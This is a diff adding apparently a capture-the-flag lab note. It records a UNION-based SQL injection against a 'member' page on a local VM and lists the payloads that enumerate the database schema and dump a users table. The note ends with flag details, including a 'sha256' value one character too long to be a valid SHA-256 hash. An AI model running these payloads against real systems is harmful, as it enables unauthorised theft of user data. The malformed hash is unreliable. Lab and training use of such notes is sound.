@@ -1,0 +1,40 @@
+page : http://192.168.120.128/index.php?page=member
+
+# Get tables name in the DB
+0 OR 1 = 2 UNION SELECT table_schema, table_name FROM information_schema.TABLES
+
+# find table columns in the DB for each table
+0 OR 1 = 2 UNION SELECT table_name, column_name FROM information_schema.COLUMNS
+
+# Table structure :
+
+Table name: users
+column : user_id
+
+Table name: users
+column : first_name
+
+Table name: users
+column : last_name
+
+Table name: users
+column : town
+
+Table name: users
+column : country
+
+Table name: users
+column : planet
+
+Table name: users
+column : Commentaire
+
+Table name: users
+column : countersign
+
+
+0 OR 1 = 2 UNION SELECT first_name, Commentaire FROM users
+
+# Flag's Commentaire = Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+# Flag's countersign = 5ff9d0165b4f92b14994e5c685cdce28
+# Flag's sha256(countersign) = 59a7f515c31c489524d2c93aa4a27b6732cf248d664389990fa8c1be8af00291a
